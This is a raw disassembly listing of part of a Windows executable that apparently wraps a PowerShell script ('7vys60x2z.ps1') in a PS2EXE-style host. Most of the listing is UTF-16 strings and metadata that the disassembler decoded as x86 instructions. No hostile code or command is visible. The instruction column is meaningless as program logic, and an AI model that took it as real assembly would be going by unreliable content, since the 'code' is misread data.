  408b0e:	65 74 65             	gs je  0x408b76
  408b11:	72 00                	jb     0x408b13
  408b13:	43                   	inc    %ebx
  408b14:	61                   	popa
  408b15:	70 74                	jo     0x408b8b
  408b17:	75 72                	jne    0x408b8b
  408b19:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408b1d:	74 5f                	je     0x408b7e
  408b1f:	56                   	push   %esi
  408b20:	61                   	popa
  408b21:	6c                   	insb   (%dx),%es:(%edi)
  408b22:	75 65                	jne    0x408b89
  408b24:	00 54 6f 55          	add    %dl,0x55(%edi,%ebp,2)
  408b28:	70 70                	jo     0x408b9a
  408b2a:	65 72 00             	gs jb  0x408b2d
  408b2d:	42                   	inc    %edx
  408b2e:	6f                   	outsl  %ds:(%esi),(%dx)
  408b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  408b30:	6c                   	insb   (%dx),%es:(%edi)
  408b31:	65 61                	gs popa
  408b33:	6e                   	outsb  %ds:(%esi),(%dx)
  408b34:	00 41 64             	add    %al,0x64(%ecx)
  408b37:	64 41                	fs inc %ecx
  408b39:	72 67                	jb     0x408ba2
  408b3b:	75 6d                	jne    0x408baa
  408b3d:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b3f:	74 00                	je     0x408b41
  408b41:	41                   	inc    %ecx
  408b42:	64 64 43             	fs fs inc %ebx
  408b45:	6f                   	outsl  %ds:(%esi),(%dx)
  408b46:	6d                   	insl   (%dx),%es:(%edi)
  408b47:	6d                   	insl   (%dx),%es:(%edi)
  408b48:	61                   	popa
  408b49:	6e                   	outsb  %ds:(%esi),(%dx)
  408b4a:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  408b4e:	79 6e                	jns    0x408bbe
  408b50:	63 43 61             	arpl   %eax,0x61(%ebx)
  408b53:	6c                   	insb   (%dx),%es:(%edi)
  408b54:	6c                   	insb   (%dx),%es:(%edi)
  408b55:	62 61 63             	bound  %esp,0x63(%ecx)
  408b58:	6b 00 50             	imul   $0x50,(%eax),%eax
  408b5b:	53                   	push   %ebx
  408b5c:	49                   	dec    %ecx
  408b5d:	6e                   	outsb  %ds:(%esi),(%dx)
  408b5e:	76 6f                	jbe    0x408bcf
  408b60:	63 61 74             	arpl   %esp,0x74(%ecx)
  408b63:	69 6f 6e 53 65 74 74 	imul   $0x74746553,0x6e(%edi),%ebp
  408b6a:	69 6e 67 73 00 42 65 	imul   $0x65420073,0x67(%esi),%ebp
  408b71:	67 69 6e 49 6e 76 6f 	imul   $0x6b6f766e,0x49(%bp),%ebp
  408b78:	6b 
  408b79:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  408b7d:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408b84:	65 
  408b85:	00 57 61             	add    %dl,0x61(%edi)
  408b88:	69 74 4f 6e 65 00 50 	imul   $0x53500065,0x6e(%edi,%ecx,2),%esi
  408b8f:	53 
  408b90:	49                   	dec    %ecx
  408b91:	6e                   	outsb  %ds:(%esi),(%dx)
  408b92:	76 6f                	jbe    0x408c03
  408b94:	63 61 74             	arpl   %esp,0x74(%ecx)
  408b97:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  408b9e:	65 49                	gs dec %ecx
  408ba0:	6e                   	outsb  %ds:(%esi),(%dx)
  408ba1:	66 6f                	outsw  %ds:(%esi),(%dx)
  408ba3:	00 67 65             	add    %ah,0x65(%edi)
  408ba6:	74 5f                	je     0x408c07
  408ba8:	49                   	dec    %ecx
  408ba9:	6e                   	outsb  %ds:(%esi),(%dx)
  408baa:	76 6f                	jbe    0x408c1b
  408bac:	63 61 74             	arpl   %esp,0x74(%ecx)
  408baf:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  408bb6:	65 49                	gs dec %ecx
  408bb8:	6e                   	outsb  %ds:(%esi),(%dx)
  408bb9:	66 6f                	outsw  %ds:(%esi),(%dx)
  408bbb:	00 50 53             	add    %dl,0x53(%eax)
  408bbe:	49                   	dec    %ecx
  408bbf:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc0:	76 6f                	jbe    0x408c31
  408bc2:	63 61 74             	arpl   %esp,0x74(%ecx)
  408bc5:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  408bcc:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408bd0:	74 5f                	je     0x408c31
  408bd2:	53                   	push   %ebx
  408bd3:	74 61                	je     0x408c36
  408bd5:	74 65                	je     0x408c3c
  408bd7:	00 67 65             	add    %ah,0x65(%edi)
  408bda:	74 5f                	je     0x408c3b
  408bdc:	52                   	push   %edx
  408bdd:	65 61                	gs popa
  408bdf:	73 6f                	jae    0x408c50
  408be1:	6e                   	outsb  %ds:(%esi),(%dx)
  408be2:	00 43 6f             	add    %al,0x6f(%ebx)
  408be5:	6d                   	insl   (%dx),%es:(%edi)
  408be6:	70 69                	jo     0x408c51
  408be8:	6c                   	insb   (%dx),%es:(%edi)
  408be9:	65 72 47             	gs jb  0x408c33
  408bec:	65 6e                	outsb  %gs:(%esi),(%dx)
  408bee:	65 72 61             	gs jb  0x408c52
  408bf1:	74 65                	je     0x408c58
  408bf3:	64 41                	fs inc %ecx
  408bf5:	74 74                	je     0x408c6b
  408bf7:	72 69                	jb     0x408c62
  408bf9:	62 75 74             	bound  %esi,0x74(%ebp)
  408bfc:	65 00 37             	add    %dh,%gs:(%edi)
  408bff:	76 79                	jbe    0x408c7a
  408c01:	73 36                	jae    0x408c39
  408c03:	30 78 32             	xor    %bh,0x32(%eax)
  408c06:	7a 2e                	jp     0x408c36
  408c08:	70 73                	jo     0x408c7d
  408c0a:	31 00                	xor    %eax,(%eax)
  408c0c:	00 01                	add    %al,(%ecx)
  408c0e:	00 21                	add    %ah,(%ecx)
  408c10:	53                   	push   %ebx
  408c11:	00 65 00             	add    %ah,0x0(%ebp)
  408c14:	63 00                	arpl   %eax,(%eax)
  408c16:	75 00                	jne    0x408c18
  408c18:	72 00                	jb     0x408c1a
  408c1a:	65 00 20             	add    %ah,%gs:(%eax)
  408c1d:	00 69 00             	add    %ch,0x0(%ecx)
  408c20:	6e                   	outsb  %ds:(%esi),(%dx)
  408c21:	00 70 00             	add    %dh,0x0(%eax)
  408c24:	75 00                	jne    0x408c26
  408c26:	74 00                	je     0x408c28
  408c28:	3a 00                	cmp    (%eax),%al
  408c2a:	20 00                	and    %al,(%eax)
  408c2c:	20 00                	and    %al,(%eax)
  408c2e:	20 00                	and    %al,(%eax)
  408c30:	00 21                	add    %ah,(%ecx)
  408c32:	49                   	dec    %ecx
  408c33:	00 6e 00             	add    %ch,0x0(%esi)
  408c36:	70 00                	jo     0x408c38
  408c38:	75 00                	jne    0x408c3a
  408c3a:	74 00                	je     0x408c3c
  408c3c:	3a 00                	cmp    (%eax),%al
  408c3e:	20 00                	and    %al,(%eax)
  408c40:	20 00                	and    %al,(%eax)
  408c42:	20 00                	and    %al,(%eax)
  408c44:	20 00                	and    %al,(%eax)
  408c46:	20 00                	and    %al,(%eax)
  408c48:	20 00                	and    %al,(%eax)
  408c4a:	20 00                	and    %al,(%eax)
  408c4c:	20 00                	and    %al,(%eax)
  408c4e:	20 00                	and    %al,(%eax)
  408c50:	20 00                	and    %al,(%eax)
  408c52:	00 05 4f 00 4b 00    	add    %al,0x4b004f
  408c58:	00 0d 43 00 61 00    	add    %cl,0x610043
  408c5e:	6e                   	outsb  %ds:(%esi),(%dx)
  408c5f:	00 63 00             	add    %ah,0x0(%ebx)
  408c62:	65 00 6c 00 00       	add    %ch,%gs:0x0(%eax,%eax,1)
  408c67:	03 00                	add    (%eax),%eax
  408c69:	00 01                	add    %al,(%ecx)
  408c6b:	17                   	pop    %ss
  408c6c:	50                   	push   %eax
  408c6d:	00 72 00             	add    %dh,0x0(%edx)
  408c70:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408c74:	73 00                	jae    0x408c76
  408c76:	20 00                	and    %al,(%eax)
  408c78:	61                   	popa
  408c79:	00 20                	add    %ah,(%eax)
  408c7b:	00 6b 00             	add    %ch,0x0(%ebx)
  408c7e:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  408c82:	00 0f                	add    %cl,(%edi)
  408c84:	23 00                	and    (%eax),%eax
  408c86:	30 00                	xor    %al,(%eax)
  408c88:	30 00                	xor    %al,(%eax)
  408c8a:	30 00                	xor    %al,(%eax)
  408c8c:	30 00                	xor    %al,(%eax)
  408c8e:	38 00                	cmp    %al,(%eax)
  408c90:	30 00                	xor    %al,(%eax)
  408c92:	00 0f                	add    %cl,(%edi)
  408c94:	23 00                	and    (%eax),%eax
  408c96:	38 00                	cmp    %al,(%eax)
  408c98:	30 00                	xor    %al,(%eax)
  408c9a:	38 00                	cmp    %al,(%eax)
  408c9c:	30 00                	xor    %al,(%eax)
  408c9e:	38 00                	cmp    %al,(%eax)
  408ca0:	30 00                	xor    %al,(%eax)
  408ca2:	00 0f                	add    %cl,(%edi)
  408ca4:	23 00                	and    (%eax),%eax
  408ca6:	30 00                	xor    %al,(%eax)
  408ca8:	30 00                	xor    %al,(%eax)
  408caa:	38 00                	cmp    %al,(%eax)
  408cac:	30 00                	xor    %al,(%eax)
  408cae:	30 00                	xor    %al,(%eax)
  408cb0:	30 00                	xor    %al,(%eax)
  408cb2:	00 0f                	add    %cl,(%edi)
  408cb4:	23 00                	and    (%eax),%eax
  408cb6:	30 00                	xor    %al,(%eax)
  408cb8:	30 00                	xor    %al,(%eax)
  408cba:	38 00                	cmp    %al,(%eax)
  408cbc:	30 00                	xor    %al,(%eax)
  408cbe:	38 00                	cmp    %al,(%eax)
  408cc0:	30 00                	xor    %al,(%eax)
  408cc2:	00 0f                	add    %cl,(%edi)
  408cc4:	23 00                	and    (%eax),%eax
  408cc6:	38 00                	cmp    %al,(%eax)
  408cc8:	30 00                	xor    %al,(%eax)
  408cca:	30 00                	xor    %al,(%eax)
  408ccc:	30 00                	xor    %al,(%eax)
  408cce:	38 00                	cmp    %al,(%eax)
  408cd0:	30 00                	xor    %al,(%eax)
  408cd2:	00 0f                	add    %cl,(%edi)
  408cd4:	23 00                	and    (%eax),%eax
  408cd6:	38 00                	cmp    %al,(%eax)
  408cd8:	30 00                	xor    %al,(%eax)
  408cda:	30 00                	xor    %al,(%eax)
  408cdc:	30 00                	xor    %al,(%eax)
  408cde:	30 00                	xor    %al,(%eax)
  408ce0:	30 00                	xor    %al,(%eax)
  408ce2:	00 0f                	add    %cl,(%edi)
  408ce4:	23 00                	and    (%eax),%eax
  408ce6:	38 00                	cmp    %al,(%eax)
  408ce8:	30 00                	xor    %al,(%eax)
  408cea:	38 00                	cmp    %al,(%eax)
  408cec:	30 00                	xor    %al,(%eax)
  408cee:	30 00                	xor    %al,(%eax)
  408cf0:	30 00                	xor    %al,(%eax)
  408cf2:	00 0f                	add    %cl,(%edi)
  408cf4:	23 00                	and    (%eax),%eax
  408cf6:	43                   	inc    %ebx
  408cf7:	00 30                	add    %dh,(%eax)
  408cf9:	00 43 00             	add    %al,0x0(%ebx)
  408cfc:	30 00                	xor    %al,(%eax)
  408cfe:	43                   	inc    %ebx
  408cff:	00 30                	add    %dh,(%eax)
  408d01:	00 00                	add    %al,(%eax)
  408d03:	0f 23 00             	mov    %eax,%db0
  408d06:	30 00                	xor    %al,(%eax)
  408d08:	30 00                	xor    %al,(%eax)
  408d0a:	46                   	inc    %esi
  408d0b:	00 46 00             	add    %al,0x0(%esi)
  408d0e:	30 00                	xor    %al,(%eax)
  408d10:	30 00                	xor    %al,(%eax)
  408d12:	00 21                	add    %ah,(%ecx)
  408d14:	52                   	push   %edx
  408d15:	00 65 00             	add    %ah,0x0(%ebp)
  408d18:	6d                   	insl   (%dx),%es:(%edi)
  408d19:	00 61 00             	add    %ah,0x0(%ecx)
  408d1c:	69 00 6e 00 69 00    	imul   $0x69006e,(%eax),%eax
  408d22:	6e                   	outsb  %ds:(%esi),(%dx)
  408d23:	00 67 00             	add    %ah,0x0(%edi)
  408d26:	20 00                	and    %al,(%eax)
  408d28:	74 00                	je     0x408d2a
  408d2a:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  408d30:	3a 00                	cmp    (%eax),%al
  408d32:	20 00                	and    %al,(%eax)
  408d34:	00 29                	add    %ch,(%ecx)
  408d36:	7b 00                	jnp    0x408d38
  408d38:	30 00                	xor    %al,(%eax)
  408d3a:	3a 00                	cmp    (%eax),%al
  408d3c:	30 00                	xor    %al,(%eax)
  408d3e:	30 00                	xor    %al,(%eax)
  408d40:	7d 00                	jge    0x408d42
  408d42:	3a 00                	cmp    (%eax),%al
  408d44:	7b 00                	jnp    0x408d46
  408d46:	31 00                	xor    %eax,(%eax)
  408d48:	3a 00                	cmp    (%eax),%al
  408d4a:	30 00                	xor    %al,(%eax)
  408d4c:	30 00                	xor    %al,(%eax)
  408d4e:	7d 00                	jge    0x408d50
  408d50:	3a 00                	cmp    (%eax),%al
  408d52:	7b 00                	jnp    0x408d54
  408d54:	32 00                	xor    (%eax),%al
  408d56:	3a 00                	cmp    (%eax),%al
  408d58:	30 00                	xor    %al,(%eax)
  408d5a:	30 00                	xor    %al,(%eax)
  408d5c:	7d 00                	jge    0x408d5e
  408d5e:	00 3f                	add    %bh,(%edi)
  408d60:	53                   	push   %ebx
  408d61:	00 79 00             	add    %bh,0x0(%ecx)
  408d64:	73 00                	jae    0x408d66
  408d66:	74 00                	je     0x408d68
  408d68:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  408d6c:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  408d70:	6f                   	outsl  %ds:(%esi),(%dx)
  408d71:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  408d75:	00 65 00             	add    %ah,0x0(%ebp)
  408d78:	63 00                	arpl   %eax,(%eax)
  408d7a:	74 00                	je     0x408d7c
  408d7c:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408d82:	73 00                	jae    0x408d84
  408d84:	2e 00 47 00          	add    %al,%cs:0x0(%edi)
  408d88:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  408d8c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408d90:	69 00 63 00 2e 00    	imul   $0x2e0063,(%eax),%eax
  408d96:	4c                   	dec    %esp
  408d97:	00 69 00             	add    %ch,0x0(%ecx)
  408d9a:	73 00                	jae    0x408d9c
  408d9c:	74 00                	je     0x408d9e
  408d9e:	00 03                	add    %al,(%ebx)
  408da0:	31 00                	xor    %eax,(%eax)
  408da2:	00 15 7b 00 30 00    	add    %dl,0x30007b
  408da8:	7d 00                	jge    0x408daa
  408daa:	5b                   	pop    %ebx
  408dab:	00 7b 00             	add    %bh,0x0(%ebx)
  408dae:	31 00                	xor    %eax,(%eax)
  408db0:	7d 00                	jge    0x408db2
  408db2:	5d                   	pop    %ebp
  408db3:	00 3a                	add    %bh,(%edx)
  408db5:	00 20                	add    %ah,(%eax)
  408db7:	00 00                	add    %al,(%eax)
  408db9:	07                   	pop    %es
  408dba:	41                   	inc    %ecx
  408dbb:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  408dbf:	00 00                	add    %al,(%eax)
  408dc1:	0f 54 00             	andps  (%eax),%xmm0
  408dc4:	6f                   	outsl  %ds:(%esi),(%dx)
  408dc5:	00 41 00             	add    %al,0x0(%ecx)
  408dc8:	72 00                	jb     0x408dca
  408dca:	72 00                	jb     0x408dcc
  408dcc:	61                   	popa
  408dcd:	00 79 00             	add    %bh,0x0(%ecx)
  408dd0:	00 0b                	add    %cl,(%ebx)
  408dd2:	7b 00                	jnp    0x408dd4
  408dd4:	30 00                	xor    %al,(%eax)
  408dd6:	7d 00                	jge    0x408dd8
  408dd8:	3a 00                	cmp    (%eax),%al
  408dda:	20 00                	and    %al,(%eax)
  408ddc:	00 29                	add    %ch,(%ecx)
  408dde:	0a 00                	or     (%eax),%al
  408de0:	28 00                	sub    %al,(%eax)
  408de2:	54                   	push   %esp
  408de3:	00 79 00             	add    %bh,0x0(%ecx)
  408de6:	70 00                	jo     0x408de8
  408de8:	65 00 20             	add    %ah,%gs:(%eax)
  408deb:	00 21                	add    %ah,(%ecx)
  408ded:	00 3f                	add    %bh,(%edi)
  408def:	00 20                	add    %ah,(%eax)
  408df1:	00 66 00             	add    %ah,0x0(%esi)
  408df4:	6f                   	outsl  %ds:(%esi),(%dx)
  408df5:	00 72 00             	add    %dh,0x0(%edx)
  408df8:	20 00                	and    %al,(%eax)
  408dfa:	68 00 65 00 6c       	push   $0x6c006500
  408dff:	00 70 00             	add    %dh,0x0(%eax)
  408e02:	2e 00 29             	add    %ch,%cs:(%ecx)
  408e05:	00 00                	add    %al,(%eax)
  408e07:	05 21 00 3f 00       	add    $0x3f0021,%eax
  408e0c:	00 47 57             	add    %al,0x57(%edi)
  408e0f:	00 72 00             	add    %dh,0x0(%edx)
  408e12:	6f                   	outsl  %ds:(%esi),(%dx)
  408e13:	00 6e 00             	add    %ch,0x0(%esi)
  408e16:	67 00 20             	add    %ah,(%bx,%si)
  408e19:	00 66 00             	add    %ah,0x0(%esi)
  408e1c:	6f                   	outsl  %ds:(%esi),(%dx)
  408e1d:	00 72 00             	add    %dh,0x0(%edx)
  408e20:	6d                   	insl   (%dx),%es:(%edi)
  408e21:	00 61 00             	add    %ah,0x0(%ecx)
  408e24:	74 00                	je     0x408e26
  408e26:	2c 00                	sub    $0x0,%al
  408e28:	20 00                	and    %al,(%eax)
  408e2a:	70 00                	jo     0x408e2c
  408e2c:	6c                   	insb   (%dx),%es:(%edi)
  408e2d:	00 65 00             	add    %ah,0x0(%ebp)
  408e30:	61                   	popa
  408e31:	00 73 00             	add    %dh,0x0(%ebx)
  408e34:	65 00 20             	add    %ah,%gs:(%eax)
  408e37:	00 72 00             	add    %dh,0x0(%edx)
  408e3a:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  408e3e:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  408e42:	74 00                	je     0x408e44
  408e44:	20 00                	and    %al,(%eax)
  408e46:	69 00 6e 00 70 00    	imul   $0x70006e,(%eax),%eax
  408e4c:	75 00                	jne    0x408e4e
  408e4e:	74 00                	je     0x408e50
  408e50:	3a 00                	cmp    (%eax),%al
  408e52:	20 00                	and    %al,(%eax)
  408e54:	00 07                	add    %al,(%edi)
  408e56:	08 00                	or     %al,(%eax)
  408e58:	20 00                	and    %al,(%eax)
  408e5a:	08 00                	or     %al,(%eax)
  408e5c:	01 03                	add    %eax,(%ebx)
  408e5e:	2a 00                	sub    (%eax),%al
  408e60:	00 1f                	add    %bl,(%edi)
  408e62:	50                   	push   %eax
  408e63:	00 53 00             	add    %dl,0x0(%ebx)
  408e66:	52                   	push   %edx
  408e67:	00 75 00             	add    %dh,0x0(%ebp)
  408e6a:	6e                   	outsb  %ds:(%esi),(%dx)
  408e6b:	00 73 00             	add    %dh,0x0(%ebx)
  408e6e:	70 00                	jo     0x408e70
  408e70:	61                   	popa
  408e71:	00 63 00             	add    %ah,0x0(%ebx)
  408e74:	65 00 2d 00 48 00 6f 	add    %ch,%gs:0x6f004800
  408e7b:	00 73 00             	add    %dh,0x0(%ebx)
  408e7e:	74 00                	je     0x408e80
  408e80:	01 05 75 00 69 00    	add    %eax,0x690075
  408e86:	00 0b                	add    %cl,(%ebx)
  408e88:	2d 00 77 00 61       	sub    $0x61007700,%eax
  408e8d:	00 69 00             	add    %ch,0x0(%ecx)
  408e90:	74 00                	je     0x408e92
  408e92:	01 11                	add    %edx,(%ecx)
  408e94:	2d 00 65 00 78       	sub    $0x78006500,%eax
  408e99:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  408e9d:	00 61 00             	add    %ah,0x0(%ecx)
  408ea0:	63 00                	arpl   %eax,(%eax)
  408ea2:	74 00                	je     0x408ea4
  408ea4:	01 03                	add    %eax,(%ebx)
  408ea6:	3a 00                	cmp    (%eax),%al
  408ea8:	00 80 dd 49 00 66    	add    %al,0x660049dd(%eax)
  408eae:	00 20                	add    %ah,(%eax)
  408eb0:	00 79 00             	add    %bh,0x0(%ecx)
  408eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  408eb4:	00 75 00             	add    %dh,0x0(%ebp)
  408eb7:	20 00                	and    %al,(%eax)
  408eb9:	73 00                	jae    0x408ebb
  408ebb:	70 00                	jo     0x408ebd
  408ebd:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408ec1:	69 00 66 00 79 00    	imul   $0x790066,(%eax),%eax
  408ec7:	20 00                	and    %al,(%eax)
  408ec9:	74 00                	je     0x408ecb
  408ecb:	68 00 65 00 20       	push   $0x20006500
  408ed0:	00 2d 00 65 00 78    	add    %ch,0x78006500
  408ed6:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  408eda:	00 61 00             	add    %ah,0x0(%ecx)
  408edd:	63 00                	arpl   %eax,(%eax)
  408edf:	74 00                	je     0x408ee1
  408ee1:	20 00                	and    %al,(%eax)
  408ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  408ee4:	00 70 00             	add    %dh,0x0(%eax)
  408ee7:	74 00                	je     0x408ee9
  408ee9:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408eef:	20 00                	and    %al,(%eax)
  408ef1:	79 00                	jns    0x408ef3
  408ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  408ef4:	00 75 00             	add    %dh,0x0(%ebp)
  408ef7:	20 00                	and    %al,(%eax)
  408ef9:	6e                   	outsb  %ds:(%esi),(%dx)
  408efa:	00 65 00             	add    %ah,0x0(%ebp)
  408efd:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  408f02:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  408f06:	00 20                	add    %ah,(%eax)
  408f08:	00 61 00             	add    %ah,0x0(%ecx)
  408f0b:	64 00 64 00 20       	add    %ah,%fs:0x20(%eax,%eax,1)
  408f10:	00 61 00             	add    %ah,0x0(%ecx)
  408f13:	20 00                	and    %al,(%eax)
  408f15:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  408f19:	6c                   	insb   (%dx),%es:(%edi)
  408f1a:	00 65 00             	add    %ah,0x0(%ebp)
  408f1d:	20 00                	and    %al,(%eax)
  408f1f:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  408f23:	72 00                	jb     0x408f25
  408f25:	20 00                	and    %al,(%eax)
  408f27:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  408f2b:	74 00                	je     0x408f2d
  408f2d:	72 00                	jb     0x408f2f
  408f2f:	61                   	popa
  408f30:	00 63 00             	add    %ah,0x0(%ebx)
  408f33:	74 00                	je     0x408f35
  408f35:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408f3b:	20 00                	and    %al,(%eax)
  408f3d:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  408f43:	74 00                	je     0x408f45
  408f45:	68 00 69 00 73       	push   $0x73006900
  408f4a:	00 20                	add    %ah,(%eax)
  408f4c:	00 77 00             	add    %dh,0x0(%edi)
  408f4f:	61                   	popa
  408f50:	00 79 00             	add    %bh,0x0(%ecx)
  408f53:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  408f58:	00 20                	add    %ah,(%eax)
  408f5a:	00 20                	add    %ah,(%eax)
  408f5c:	00 2d 00 65 00 78    	add    %ch,0x78006500
  408f62:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  408f66:	00 61 00             	add    %ah,0x0(%ecx)
  408f69:	63 00                	arpl   %eax,(%eax)
  408f6b:	74 00                	je     0x408f6d
  408f6d:	3a 00                	cmp    (%eax),%al
  408f6f:	22 00                	and    (%eax),%al
  408f71:	3c 00                	cmp    $0x0,%al
  408f73:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  408f77:	6c                   	insb   (%dx),%es:(%edi)
  408f78:	00 65 00             	add    %ah,0x0(%ebp)
  408f7b:	6e                   	outsb  %ds:(%esi),(%dx)
  408f7c:	00 61 00             	add    %ah,0x0(%ecx)
  408f7f:	6d                   	insl   (%dx),%es:(%edi)
  408f80:	00 65 00             	add    %ah,0x0(%ebp)
  408f83:	3e 00 22             	add    %ah,%ds:(%edx)
  408f86:	00 01                	add    %al,(%ecx)
  408f88:	09 2d 00 65 00 6e    	or     %ebp,0x6e006500
  408f8e:	00 64 00 01          	add    %ah,0x1(%eax,%eax,1)
  408f92:	0d 2d 00 64 00       	or     $0x64002d,%eax
  408f97:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  408f9b:	75 00                	jne    0x408f9d
  408f9d:	67 00 01             	add    %al,(%bx,%di)
  408fa0:	1b 37                	sbb    (%edi),%esi
  408fa2:	00 76 00             	add    %dh,0x0(%esi)
  408fa5:	79 00                	jns    0x408fa7
  408fa7:	73 00                	jae    0x408fa9
  408fa9:	36 00 30             	add    %dh,%ss:(%eax)
  408fac:	00 78 00             	add    %bh,0x0(%eax)
  408faf:	32 00                	xor    (%eax),%al
  408fb1:	7a 00                	jp     0x408fb3
  408fb3:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  408fb7:	73 00                	jae    0x408fb9
  408fb9:	31 00                	xor    %eax,(%eax)
  408fbb:	00 2f                	add    %ch,(%edi)
  408fbd:	5e                   	pop    %esi
  408fbe:	00 2d 00 28 00 5b    	add    %ch,0x5b002800
  408fc4:	00 5e 00             	add    %bl,0x0(%esi)
  408fc7:	3a 00                	cmp    (%eax),%al
  408fc9:	20 00                	and    %al,(%eax)
  408fcb:	5d                   	pop    %ebp
  408fcc:	00 2b                	add    %ch,(%ebx)
  408fce:	00 29                	add    %ch,(%ecx)
  408fd0:	00 5b 00             	add    %bl,0x0(%ebx)
  408fd3:	20 00                	and    %al,(%eax)
  408fd5:	3a 00                	cmp    (%eax),%al
  408fd7:	5d                   	pop    %ebp
  408fd8:	00 3f                	add    %bh,(%edi)
  408fda:	00 28                	add    %ch,(%eax)
  408fdc:	00 5b 00             	add    %bl,0x0(%ebx)
  408fdf:	5e                   	pop    %esi
  408fe0:	00 3a                	add    %bh,(%edx)
  408fe2:	00 5d 00             	add    %bl,0x0(%ebp)
  408fe5:	2a 00                	sub    (%eax),%al
  408fe7:	29 00                	sub    %eax,(%eax)
  408fe9:	24 00                	and    $0x0,%al
  408feb:	01 09                	add    %ecx,(%ecx)
  408fed:	54                   	push   %esp
  408fee:	00 72 00             	add    %dh,0x0(%edx)
  408ff1:	75 00                	jne    0x408ff3
  408ff3:	65 00 00             	add    %al,%gs:(%eax)
  408ff6:	0b 24 00             	or     (%eax,%eax,1),%esp
  408ff9:	54                   	push   %esp
  408ffa:	00 52 00             	add    %dl,0x0(%edx)
  408ffd:	55                   	push   %ebp
  408ffe:	00 45 00             	add    %al,0x0(%ebp)
  409001:	00 0b                	add    %cl,(%ebx)
  409003:	46                   	inc    %esi
  409004:	00 61 00             	add    %ah,0x0(%ecx)
  409007:	6c                   	insb   (%dx),%es:(%edi)
  409008:	00 73 00             	add    %dh,0x0(%ebx)
  40900b:	65 00 00             	add    %al,%gs:(%eax)
  40900e:	0d 24 00 46 00       	or     $0x460024,%eax
  409013:	41                   	inc    %ecx
  409014:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  409018:	00 45 00             	add    %al,0x0(%ebp)
  40901b:	00 15 4f 00 75 00    	add    %dl,0x75004f
  409021:	74 00                	je     0x409023
  409023:	2d 00 53 00 74       	sub    $0x74005300,%eax
  409028:	00 72 00             	add    %dh,0x0(%edx)
  40902b:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  409031:	01 0d 53 00 74 00    	add    %ecx,0x740053
  409037:	72 00                	jb     0x409039
  409039:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40903d:	6d                   	insl   (%dx),%es:(%edi)
  40903e:	00 00                	add    %al,(%eax)
  409040:	27                   	daa
  409041:	43                   	inc    %ebx
  409042:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  409046:	00 63 00             	add    %ah,0x0(%ebx)
  409049:	6b 00 20             	imul   $0x20,(%eax),%eax
  40904c:	00 4f 00             	add    %cl,0x0(%edi)
  40904f:	4b                   	dec    %ebx
  409050:	00 20                	add    %ah,(%eax)
  409052:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  409056:	00 20                	add    %ah,(%eax)
  409058:	00 65 00             	add    %ah,0x0(%ebp)
  40905b:	78 00                	js     0x40905d
  40905d:	69 00 74 00 2e 00    	imul   $0x2e0074,(%eax),%eax
  409063:	2e 00 2e             	add    %ch,%cs:(%esi)
  409066:	00 00                	add    %al,(%eax)
  409068:	2f                   	das
  409069:	55                   	push   %ebp
  40906a:	00 6e 00             	add    %ch,0x0(%esi)
  40906d:	68 00 61 00 6e       	push   $0x6e006100
  409072:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409076:	00 65 00             	add    %ah,0x0(%ebp)
  409079:	64 00 20             	add    %ah,%fs:(%eax)
  40907c:	00 65 00             	add    %ah,0x0(%ebp)
  40907f:	78 00                	js     0x409081
  409081:	63 00                	arpl   %eax,(%eax)
  409083:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  409087:	74 00                	je     0x409089
  409089:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40908f:	20 00                	and    %al,(%eax)
  409091:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  409097:	00 e5                	add    %ah,%ch
  409099:	b8 42 37 fd f6       	mov    $0xf6fd3742,%eax
  40909e:	22 49 85             	and    -0x7b(%ecx),%cl
  4090a1:	e8 d7 33 59 17       	call   0x1799c47d
